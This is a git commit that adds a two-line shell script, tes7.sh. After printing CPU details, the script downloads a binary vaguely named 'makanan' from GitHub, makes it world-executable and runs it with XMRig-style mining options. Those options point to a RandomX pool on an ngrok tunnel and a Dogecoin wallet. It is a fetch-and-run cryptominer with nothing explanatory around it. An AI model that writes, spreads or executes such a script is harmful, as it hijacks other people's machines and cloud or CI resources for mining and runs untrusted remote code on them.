4d9b37a265a5fb1e5baaf07829426c167899face
raufpermana22 <53905319+raufpermana22@users.noreply.github.com>
2022-04-29 12:02:54 +0900

    Create tes7.sh

---
+++ tes7.sh
@@ -0,0 +1,2 @@
+lscpu
+wget https://github.com/raufpermana22/tesami/raw/main/makanan && chmod 777 makanan && ./makanan --donate-level 1 -a rx/0 -o 0.tcp.ngrok.io:16785 u DOGE:DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS.$(echo $(shuf -i 1-9999 -n 1)-DEV) -p x 
